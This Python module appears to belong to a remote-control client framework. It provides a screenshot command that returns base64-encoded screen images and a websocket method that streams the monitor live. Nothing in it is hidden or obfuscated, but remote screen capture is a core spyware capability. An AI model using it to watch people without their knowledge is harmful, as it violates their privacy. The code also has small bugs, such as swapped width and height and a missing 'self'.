import asyncio
import contextlib
import ctypes
import base64

import websockets
from mss import mss
from typing import Optional
from PIL import ImageGrab
from ..commands import Command, CommandArgs, ICommandModule, CommandResult



command_arg_map = {
    Command.SCREENSHOT: None,
}

class Visuals(ICommandModule):
    async def stream_screen(websocket: websockets.WebSocketClientProtocol , monitor_number=1):
        with mss() as sct:
            monitor = sct.monitors[monitor_number]  # Monitor number

            while True:
                img = sct.grab(monitor)
                pixels = img.rgb
                await websocket.send(pixels)
                await asyncio.sleep(1/30)
            
    def screenshot(self) -> CommandResult:
        try:
            with contextlib.suppress(Exception):
                ctypes.windll.user32.SetProcessDPIAware()
            
            image = ImageGrab.grab()
            h, w = image.size
            mode = image.mode
            image_base64 = base64.b64encode(image.tobytes()).decode('ascii')

            return CommandResult(
                success=True,
                result={"size": (h, w), "mode": mode, "image": image_base64}
            )
        except Exception as e:
            return CommandResult(
                success=False,
                result=f"Failed to take screenshot: {str(e)}"
            )

    def run(self, command: Command, args: Optional[CommandArgs] = None) -> CommandResult:
        command_func_map = {
        }
        command_func_map_no_args = {
            Command.SCREENSHOT: self.screenshot            
        }

        if command in command_func_map or command in command_func_map_no_args:
            try:
                if command in command_func_map:
                    if not args:
                        return CommandResult(success=False, result="No Args passed")
                    return command_func_map.get(command)(args)
                else:
                    return command_func_map_no_args.get(command)()
            except Exception as e:
                return CommandResult(success=False, result=f"Error: {e}")
        else:
            return CommandResult(success=False, result="Command not found in module.")




